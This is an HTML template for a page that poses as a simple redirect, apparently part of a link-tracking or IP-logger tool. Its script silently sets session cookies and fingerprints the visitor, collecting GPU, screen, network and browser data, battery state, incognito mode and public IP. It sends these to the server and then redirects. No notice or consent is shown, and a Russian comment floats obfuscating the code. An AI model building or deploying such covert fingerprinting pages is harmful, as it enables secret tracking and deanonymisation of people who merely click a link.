<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Redirect</title>
  </head>
  <body>
    <pre id="json_el"></pre>

    <!--  libs  -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="/static/js/lib/detectIncognito.min.js"></script>

    <!--  utils  -->
    <script src="/static/js/utils.js"></script>

    <!--  services  -->
    <script src="/static/js/services/Cookie.js"></script>
    <script src="/static/js/services/DetectorFactory.js"></script>

    <!-- main   -->
    <script src="/static/js/detectors.js"></script>
    <script src="/static/js/app.js"></script>

    <script>
      const cookie = new Cookie();
      const detectorFactory = new DetectorFactory();

      detectorFactory.add("detectGPU", detectGPU);
      detectorFactory.add("detectScreen", detectScreen);
      detectorFactory.add("getNetworkInfo", getNetworkInfo);
      detectorFactory.add("getNavigatorData", getNavigatorData);
      detectorFactory.add("JSVersion", getJSVersion);

      const url = new URL("{{ context.url }}");
      function redirect() {window.location.href = "{{ context.url }}";}

      let _promises = 1;

      function incrementPromises() {
        _promises+=1;
        //console.log("increment: "+ _promises);
      }

      function decrementPromises() {
        _promises-=1;
        //console.log("decrementPromises: "+ _promises);
        if(_promises<=0) redirect();
       // if(_promises<=0) console.log("[redirect]");
      }

      function updateData(patch) {
        $.ajax({
          type: 'PATCH',
          url: '/update?id={{ context.session_id }}',
          data: JSON.stringify(patch),
          processData: false,
          contentType: 'application/merge-patch+json',
        }).always(function() {
          decrementPromises();
        });
      }

      function callbackDetection() {
        _promises+=3;
        //console.log("1: "+ _promises);
        // {{speed_test}}
        {% if speed_test is sameas true %}_promises+=1; fastSpeedTest(updateData);{% endif %}
        detectBattery(updateData);
        navigation_mode(updateData);
        detectPublicIP(updateData);
      }

      function startDetection() {
        callbackDetection();
        updateData(detectorFactory.getData());
      }

      (function(d) {
        cookie.setCookie("_session_id", "{{ context.session_id }}", 7);
        cookie.setCookie("_session_time", (new Date()).toISOString(), 7);

        detectorFactory.init();

        startDetection();
         // window.history.pushState("", "Redirect", url.pathname);
      })(document)
      // Можно обфусцировать дело
      //

    </script>
  </body>
</html>
